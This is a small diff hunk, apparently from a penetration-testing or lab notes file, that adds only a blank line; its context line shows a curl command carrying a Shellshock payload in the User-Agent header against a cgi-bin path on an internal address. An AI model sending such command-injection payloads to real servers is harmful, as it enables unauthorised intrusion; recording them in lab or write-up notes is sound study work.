@@ -758,3 +758,4 @@ curl -H 'User-Agent: () { :; }; /bin/bash -c "sleep 5"' http://10.11.2.12/cgi-bi
 ```
 
 ![[Pasted image 20240622195528.png]]
+
